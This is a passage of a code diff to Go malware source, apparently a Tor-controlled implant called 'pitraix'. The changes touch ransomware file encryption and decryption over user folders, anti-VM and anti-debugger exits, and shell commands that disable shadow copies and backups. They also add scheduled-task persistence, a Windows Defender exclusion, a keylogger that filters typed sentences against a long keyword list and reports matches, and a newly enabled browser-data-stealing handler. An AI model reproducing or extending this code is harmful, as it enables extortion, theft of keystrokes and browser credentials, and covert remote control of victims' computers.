+			// 	mainDrive + "\\" + "Users\\" + username + "\\Downloads",
+			// 	mainDrive + "\\" + "Users\\" + username + "\\Pictures",
+			// 	mainDrive + "\\" + "Users\\" + username + "\\Videos",
+			// 	mainDrive + "\\" + "Users\\" + username + "\\Music",
+			// }
+
+
+			go decFiles(startPath, key)
+
+
+			// for _, path := range start_paths {
+			// 	go decFiles(path, key)
+			// }
 
 			out = "Done"
 		}
@@ -1543,22 +1690,26 @@ func decFiles(path string, key []byte) {
 
 		if strings.HasSuffix(fname, ".ini") || strings.HasSuffix(fname, ".lnk") {
 			continue
+
 		}
 
 		if file.IsDir() {
-			decFiles(filepath.Join(path, fname), key)
+			go decFiles(filepath.Join(path, fname), key)
 			continue
+
 		}
 
 		if (path == filepath.Join(mainDrive, "Users", username, "Desktop")) && strings.HasPrefix(fname, "READ_ME_") && fname != "READ_ME_" {
 			os.Remove(filepath.Join(path, fname))
 			continue
+
 		}
 
 		f, err := readFile(filepath.Join(path, fname))
 		if err != nil {
 			fmt.Println("error reading file:", err)
 			continue
+
 		}
 
 		fnamesplt := strings.Split(fname, "_")
@@ -1568,11 +1719,13 @@ func decFiles(path string, key []byte) {
 			if err != nil {
 				fmt.Println("nonce error:", err)
 				continue
+
 			}
 			decypher, err := decrypt_AES(f, nonce , key)
 			if err != nil {
 				fmt.Println("decryption error:", err)
 				continue
+
 			}
 			os.Remove(filepath.Join(path, fname))
 			out, err := os.Create(filepath.Join(path, fnamesplt[0])) // + filepath.Ext(fname))
@@ -1580,7 +1733,9 @@ func decFiles(path string, key []byte) {
 			if err != nil {
 				fmt.Println("error creating encrypted file:", err)
 				continue
+
 			}
+			
 			out.Close()	
 		}
 
@@ -1589,10 +1744,12 @@ func decFiles(path string, key []byte) {
 
 func encFiles(path string, key []byte) {
 	files, err := ioutil.ReadDir(path)
+	
 	if err != nil {
 		fmt.Println("error reading directory:", err)
 		// continue
 	}
+
 	for _, file := range files {
 		fname := file.Name()
 
@@ -1601,7 +1758,7 @@ func encFiles(path string, key []byte) {
 		}
 
 		if file.IsDir() {
-			encFiles(filepath.Join(path, fname), key)
+			go encFiles(filepath.Join(path, fname), key)
 			continue
 		}
 
@@ -1654,13 +1811,16 @@ func unzip(src, dest string) error {
             if err := rc.Close(); err != nil {
 				log("unzip", "error while extracting: " + err.Error())
                 fmt.Println(err)
+
             }
+
         }()
 
         path := filepath.Join(dest, f.Name)
 
         if f.FileInfo().IsDir() {
             os.MkdirAll(path, f.Mode())
+
         } else {
             os.MkdirAll(filepath.Dir(path), f.Mode())
             f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
@@ -1670,12 +1830,15 @@ func unzip(src, dest string) error {
             defer func() {
                 if err := f.Close(); err != nil {
                     fmt.Println(err)
+
                 }
+
             }()
 
             _, err = io.Copy(f, rc)
             if err != nil {
                 return err
+
             }
         }
         return nil
@@ -1715,22 +1878,35 @@ func getMachineInfo() (string, int, string, string, int, string, string, string)
 	kernelVersion = osVariant[19:len(osVariant) - 1]
 	//osVariant = strings.TrimSpace(osVariant[8:])
 	
-	VendorInfo := strings.TrimSpace(doInstru("shell", "wmic computersystem get manufacturer, model,name", true))
+	VendorInfo := strings.TrimSpace(doInstru("shell", "wmic computersystem get manufacturer,model,name,totalphysicalmemory", true))
 	VendorInfoField := strings.Fields(VendorInfo)
-	machineModel = VendorInfoField[len(VendorInfoField) - 2]
-	hostname = VendorInfoField[len(VendorInfoField) - 1]
+	memory = VendorInfoField[len(VendorInfoField) - 1]
 
+	machineModel = VendorInfoField[len(VendorInfoField) - 3]
+	hostname = VendorInfoField[len(VendorInfoField) - 2]
 	VendorSplitted := strings.Split(VendorInfo, "\n")
-	machineVendor = strings.TrimSpace(VendorInfo[len(VendorSplitted[0]) + 1: len(VendorInfo) - (len(machineModel) + len(hostname) + 2)])
+	machineVendor = strings.TrimSpace(VendorInfo[len(VendorSplitted[0]) + 1: len(VendorInfo) - (len(machineModel) + len(hostname) + len(memory) + 4)])
+
+	// fmt.Println(VendorInfoField, "\n", machineModel, hostname, memory, machineVendor)
+
+	
+	// VendorInfo := strings.TrimSpace(doInstru("shell", "wmic computersystem get manufacturer, model,name", true))
+	// VendorInfoField := strings.Fields(VendorInfo)
+	// machineModel = VendorInfoField[len(VendorInfoField) - 2]
+	// hostname = VendorInfoField[len(VendorInfoField) - 1]
+
+	// VendorSplitted := strings.Split(VendorInfo, "\n")
+	// machineVendor = strings.TrimSpace(VendorInfo[len(VendorSplitted[0]) + 1: len(VendorInfo) - (len(machineModel) + len(hostname) + 2)])
 
 	if strings.Contains(hostname, "DESKTOP") || strings.Contains(hostname, "PC") {
 		machineType = 0
+		
 	} else {
 		machineType = 1
 	}
 
-	meminfo_Raw := strings.Fields(strings.TrimSpace(doInstru("shell", "wmic computersystem get totalphysicalmemory", true)))
-	memory = meminfo_Raw[1]
+	// meminfo_Raw := strings.Fields(strings.TrimSpace(doInstru("shell", "wmic computersystem get totalphysicalmemory", true)))
+	// memory = meminfo_Raw[1]
 
 
 
@@ -1742,6 +1918,9 @@ func getMachineInfo() (string, int, string, string, int, string, string, string)
 
 func vmCheck(userHostname, cpuVendor, machineVendor, machineModel string) {
 	var vmCPU = map[string]bool{
+		/*
+			This will detect KVM, Microsoft Hyper, VMware, Xen and more
+		*/
 		"bhyve bhyve ": true,
 		" KVMKVMKVM  ": true,
 		"TCGTCGTCGTCG": true,
@@ -1750,12 +1929,12 @@ func vmCheck(userHostname, cpuVendor, machineVendor, machineModel string) {
 		"VMwareVMware": true,
 		"XenVMMXenVMM": true,
 		"ACRNACRNACRN": true,
-		" QNXQVMBSQG ": true, // effect embedded systems 
+		" QNXQVMBSQG ": true, // This might affect embedded systems 
 
 	}
 	if vmCPU[cpuVendor] || machineVendor == "innotek GmbH" || machineModel == "VirtualBox" {
 		fmt.Println("VM Detected")
-		os.Exit(0) // you could change this to something more sneaky
+		os.Exit(0)
 	}
 }
 
@@ -1835,7 +2014,7 @@ func getMacAddr() (string, error) {
 	return "", nil
 }
 
-func measureTime(m int, intptr *int) { // i know this sucks and useless. next relesae it will based on actual time
+func measureTime(m int, intptr *int) { // This is hacky solution, next release will use actual time instead of counter
 	*intptr = m
 
 	// fmt.Println(intptr, *intptr, mtimep)
@@ -1866,7 +2045,7 @@ func main() {
 	// f.Write(x)
 	// f.Close()
 	
-	// connection, err := net.Dial(SERVER_TYPE, "127.0.0.1:123")
+	// connection, err := net.Dial("abcde", "127.0.0.1:123")
 	// if err != nil {
 	// 	fmt.Println("failed 2 connect", err)
 	// }
@@ -1892,14 +2071,14 @@ func main() {
 
 	if IsUpper(agentAddress) || IsUpper(raw_OPEncryptionKeyPEM){
 		fmt.Println("Be sure to run OPER before compiling!!", agentAddress, raw_OPEncryptionKeyPEM)
-		time.Sleep(10 * time.Second)
+		time.Sleep(15 * time.Second)
 		os.Exit(0)
 	}
 
 	// fmt.Println(raw_OPEncryptionKeyPEM, agentAddress)
 
 
-	go measureTime(3, &mtimep) 		  // this will catch a debugger
+	go measureTime(3, &mtimep) // This will catch a debugger
 
 	contactDate = time.Now().String() 
 
@@ -1932,7 +2111,7 @@ func main() {
 
 	torPort := strconv.Itoa(rdmod.Intn(6999 - 3000) + 3000)	
 	
-	if running_check(torPort) { // exits if already running
+	if running_check(torPort) { // Exits if already running
 		os.Exit(0)
 	}
 	
@@ -1969,19 +2148,23 @@ func main() {
 	*/
 
 	pointerPaths := nonPrivPaths
+
 	if isadmin_const {
 		pointerPaths = privPaths
 		doInstru("shell", "taskkill /fi \"Services eq VSS\" /F", true) // Disables Volume Shadow Copy
 		doInstru("shell", "wbadmin disable backup -quiet", true) // Disables backups
 		doInstru("shell", "taskkill /f /im OneDrive.exe", true) // kills onedrive
 	}
+
 	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "PRRFORVPRIVLPERSDFTN" + cpu + userHomeDIR + username ))))
 	pitraix_FilePath = filepath.Join(pointerPaths[rdmod.Intn(len(pointerPaths) - 1)], pitraix_FilePath)
 	// pitraix_spreadPath := pitraix_FilePath + "SP.exe"
 	pitraix_FilePath += ".exe"
 	
+
 	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "VICCJIFJIRJVRIJGIERJFIHJ" + cpu + username ))))
 	config_FilePath = filepath.Join(pointerPaths[rdmod.Intn(len(pointerPaths) - 1)], config_FilePath)
+
 
 	rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "AYYYECRAYYEACYEEEDXEGHQ" + cpu + username + userHomeDIR ))))
 	tor_FolderPath := pointerPaths[rdmod.Intn(len(pointerPaths) - 1)]
@@ -1989,6 +2172,7 @@ func main() {
 	// fmt.Println("pitraix_FilePath:", pitraix_FilePath, "\nconfig_FilePath:", config_FilePath, "\ntor_FolderPath:", tor_FolderPath)
 
 	// rdmod.Seed(int64(bytesumbig([]byte(userHomeDIR + "MGUNRU4UFHHW2U8JSDQ" + cpu))))
+
 	pitraix_taskName, _ := predictable_random("MGUNRU4UFHHW2U8JSDQ" + cpu + username + cpu, 0, true)
 	if len(pitraix_taskName) > 15 {
 		pitraix_taskName = pitraix_taskName[:15]
@@ -2009,14 +2193,15 @@ func main() {
 
 		// time.Sleep(time.Second * 5)
 		if isadmin_const {
+			// Windows\\System32\\schtasks.exe 
 			// doInstru("shell", `schtasks.exe /CREATE /SC ONLOGON /TN "` + pitraix_taskName + `" /TR "` + pitraix_FilePath + `" /RL HIGHEST /F`)
-			doInstru("shell", fmt.Sprintf("%s\\Windows\\System32\\schtasks.exe /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", mainDrive ,pitraix_taskName, pitraix_FilePath), true)
+			doInstru("shell", fmt.Sprintf("%s /CREATE /SC ONLOGON /TN %s /TR %s /RL HIGHEST /F", filepath.Join(mainDrive, "Windows", "System32", "schtasks.exe"), pitraix_taskName, pitraix_FilePath), true)
 			// fmt.Println("admin!", out)
 
 			doInstru("shell", "powershell.exe -Command Add-MpPreference -ExclusionPath " + tmpFold, true)
 
 		} else {
-			doInstru("shell", fmt.Sprintf("%s\\Windows\\System32\\schtasks.exe /CREATE /SC DAILY /TN %s /TR %s /F", mainDrive, pitraix_taskName, pitraix_FilePath), true)
+			doInstru("shell", fmt.Sprintf("%s /CREATE /SC DAILY /TN %s /TR %s /F", filepath.Join(mainDrive, "Windows", "System32", "schtasks.exe"), pitraix_taskName, pitraix_FilePath), true)
 			// fmt.Println("no :(", out)
 		}
 
@@ -2038,7 +2223,7 @@ func main() {
 		out, _ := json.Marshal(cft)
 		pl_encrypted, pl_nonce, _ := encrypt_AES(out, locAES_Key)
 		f, _ := os.Create(config_FilePath)
-		f.WriteString(base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
+		f.Write(append(pl_encrypted, pl_nonce...)) // base64.StdEncoding.EncodeToString(pl_encrypted) + "|" + base64.StdEncoding.EncodeToString(pl_nonce))
 		f.Close()
 		// if err != nil {
 		// 	fmt.Println("Error creating config file!", config_FilePath, err)
@@ -2077,17 +2262,28 @@ func main() {
 			"hid",
 			"tor",
 			"hack",
-			"crack",
-			"engineer",
+			"palest",
+			"tox",
+			"tut",
+			"light",
+			"dark",
+			"crac",
+			"engine",
 			"spam",
+			"spain",
 			"spanish",
-			"russia",
+			"russ",
 			"hebrew",
 			"yiddish",
 			"log",
 			"i2p",
 			"freenet",
 			"whonix",
+			"why",
+			"where",
+			"who",
+			"owo",
+			"uwu",
 			"qube",
 			"tails",
 			"usb",
@@ -2097,13 +2293,14 @@ func main() {
 			"sell",
 			"buy",
 			"ubuntu",
+			"bf",
+			"gf",
 			"debian",
-			"manjaro",
+			"ma",
 			"arch",
 			"fedora",
 			"harden",
 			"bot",
-			"mal",
 			"data",
 			"dev",
 			"psyop",
@@ -2113,7 +2310,8 @@ func main() {
 			"python",
 			"c++",
 			"c#",
-			"binary",
+			"bin",
+			"js",
 			"java",
 			"golang",
 			"html",
@@ -2141,30 +2339,32 @@ func main() {
 			"coc",
 			"pus",
 			"as",
+			"season",
 			"ti",
 			"bal",
 			"youn",
 			"ki",
 			"tee",
 			"chil",
-			"fullz",
 			"cp",
 			"por",
 			"x",
 			"tra",
-			"gay",
+			"bdsm",
+			"cp",
+			"ga",
 			"lgb",
-			"blow",
+			"blo",
 			"rap",
-			"stalk",
-			"horny",
-			"naked",
-			"hard",
-			"soft",
+			"stal",
+			"horn",
+			"nake",
+			"har",
+			"sof",
 			"bre",
 			"adios",
-			"straight",
-			"girl",
+			"strai",
+			"gir",
 			"fur",
 			"cub",
 			"prostitut",
@@ -2184,8 +2384,8 @@ func main() {
 			"www.",
 			"world",
 			"would",
+			"shabat",
 			"shabbat",
-			"plan",
 			"white",
 			"black",
 			"je",
@@ -2200,10 +2400,9 @@ func main() {
 			"iraq",
 			"habib",
 			"kernel",
-			"syria",
+			"syri",
 			"shalom",
 			"flight",
-			"drone",
 			"nuclear",
 			"nuke",
 			"num",
@@ -2213,11 +2412,16 @@ func main() {
 			"guns",
 			"glock",
 			"pistol",
+			"rid",
+			"rod",
+			"hear",
 			"rifle",
 			"rights",
 			"constitution",
 			"law",
-			"atm",
+			"at",
+			"power",
+			"electric",
 			"sub",
 			"weapon",
 			"east",
@@ -2237,7 +2441,6 @@ func main() {
 			"pro",
 			"betray",
 			"how",
-			"manual",
 			"facebook",
 			"guard",
 			"knight",
@@ -2246,7 +2449,10 @@ func main() {
 			"pathetic",
 			"youtube",
 			"google",
-			"kill",
+			"kil",
+			"research",
+			"graduate",
+			"colleague",
 			"duckduckgo",
 			"ddg",
 			"startpage",
@@ -2260,20 +2466,38 @@ func main() {
 			"mod",
 			"onion",
 			"monero",
-			"bitcoin",
+			"bit",
 			"ether",
 			"withdraw",
 			"hill",
 			"crypt",
+			"cypher",
+			"cipher",
 			"encrypt",
-			"sign",
+			"encipher",
+			"sig",
 			"decrypt",
+			"detect",
+			"decypher",
+			"dru",
+			"dri",
+			"drone",
+			"ransom",
+			"ware",
+			"drove",
+			"decipher",
 			"coin",
 			"byte",
-			"bit",
 			"mixer",
 			"amd",
 			"intel",
+			"india",
+			"jeal",
+			"superman",
+			"support",
+			"plan",
+			"batman",
+			"wonder",
 			"nvidia",
 			"linux",
 			"problem",
@@ -2282,23 +2506,40 @@ func main() {
 			"under",
 			"bsd",
 			"assembly",
+			"compiler",
+			"interpreter",
 			"suicid",
 			"card",
+			"put",
+			"delet",
 			"call",
+			"slow",
+			"breach",
+			"null",
+			"nil",
+			"nick",
+			"iot",
+			"mirar",
 			"visit",
 			"email",
-			"mail",
 			"post",
 			"get",
+			"gpg",
+			"pgp",
+			"winter",
+			"summer",
+			"snow",
+			"hot",
+			"cold",
+			"spotify",
 			"slack",
 			"irc",
 			"jabber",
-			"xmpp",
-			"matrix",
+			"xmp",
 			"element",
 			"client",
 			"user",
-			"dark",
+			"create",
 			"deep",
 			"cyber",
 			"private",
@@ -2307,7 +2548,7 @@ func main() {
 			"tap",
 			"security",
 			"session",
-			"cookie",
+			"loop",
 			"csrf",
 			"sql",
 			"inject",
@@ -2330,6 +2571,9 @@ func main() {
 			"scam",
 			"http",
 			"bought",
+			"amazon",
+			"deliver",
+			"phd",
 			"spread",
 			"profile",
 			"nord",
@@ -2388,10 +2632,15 @@ func main() {
 			"jail",
 			"prison",
 			"torture",
+			"told",
+			"tell",
 			"homeland",
 			"motherland",
 			"goverment",
 			"work",
+			"woman",
+			"women",
+			"lad",
 			"job",
 			"poor",
 			"rich",
@@ -2400,6 +2649,8 @@ func main() {
 			"shin",
 			"bnd",
 			"dod",
+			"domain",
+			"active",
 			"meeting",
 			"schedule",
 			"heading to",
@@ -2426,9 +2677,13 @@ func main() {
 			"coke",
 			"cocaine",
 			"mdma",
-			"marijuana",
 			"oxycodone",
 			"morphine",
+			"blue",
+			"test",
+			"estrogen",
+			"math",
+			"mar",
 			"steroid",
 			"overdose",
 			"angel",
@@ -2467,6 +2722,7 @@ func main() {
 			"college",
 			"school",
 			"daycare",
+			"care",
 			"sleep",
 			"slept",
 			"bed",
@@ -2555,9 +2811,9 @@ func main() {
 
 			if match == true {
 				fmt.Println("keylog event match:", sentence)
-				event("keylog", sentence)
+				go event("keylog", sentence)
 			} else {
-				fmt.Println("uninteresting:", sentence)
+				fmt.Println("ignoring:", sentence)
 			}
 		}
 	}(klogChn1)
@@ -2575,7 +2831,7 @@ func main() {
 		
 		var shiftPressed bool = false
 		var ctrlPressed bool = false
-
+		
 		specialchars := map[int]string{
 			0x30: ")",
 			0x31: "!",
@@ -2989,7 +3245,7 @@ func main() {
 		if err != nil {
 			// log("Register", "Error") // + err.Error())
 			fmt.Println("Error contacting Agent to register. ", err)
-			time.Sleep(2 * time.Second) // DEBUG Increase to 2-9 seconds via randomizer later
+			time.Sleep(5 * time.Second)
 
 		} else {
 			fmt.Println("Respone: ", string(response), err)
@@ -3032,17 +3288,17 @@ func main() {
 	fmt.Println("browserS_onetimeKey", browserS_onetimeKey)
 	
 	http.HandleFunc("/websocket" + rdp_onetimeKey, rdp)
-	
-	// http.HandleFunc("/websocket" + browserS_onetimeKey, snatchBrowsersData)
+	http.HandleFunc("/websocket" + browserS_onetimeKey, snatchBrowsersData)
 
 
 
 
 	http.HandleFunc("/", func(writer http.ResponseWriter, req *http.Request) {
-		req.Body = http.MaxBytesReader(writer, req.Body, 3000) // if anything wrong, its prolly dis bitch
+		req.Body = http.MaxBytesReader(writer, req.Body, 2500)
+
 		if req.Method == "GET" {
 			// io.WriteString(writer, "")
-			log("Foreign - GET", "Received GET request")
+			go log("Foreign - GET", "Received GET request")
 			fmt.Println("Got GET request! ", req.Body)
 
 		} else if req.Method == "POST" {
@@ -3108,6 +3364,7 @@ func main() {
 										for index, instru := range instructions {
 											fmt.Println("INSTRUCTION:", index, instru)
 											instru_split := strings.Split(instru, " ")
+
 											if len(instru_split) == 0 {
 												fmt.Println("wtf?", index, instru)
 												go log("Foreign - POST", "Received ZERO INSTRUCTIONS: " + string(decipher))
@@ -3129,7 +3386,7 @@ func main() {
 										}
 
 
-										fmt.Println("Received instructions:",err, len(instructions), string(decipher))
+										fmt.Println("Received instructions:", err, len(instructions), string(decipher))
 
 										final_output = strings.TrimSpace(final_output) // [:len(final_output) - 2]
 
@@ -3149,7 +3406,7 @@ func main() {
 
 				} else {
 
-					go log("Foreign - POST", "Received POST request without data length 2: " + strconv.Itoa(len(dataSlice)))
+					go log("Foreign - POST", "Received POST request without data length: " + strconv.Itoa(len(dataSlice)))
 					// fmt.Println("Got POST request without DataSlice 2! ", dataSlice, len(dataSlice))
 
 				}
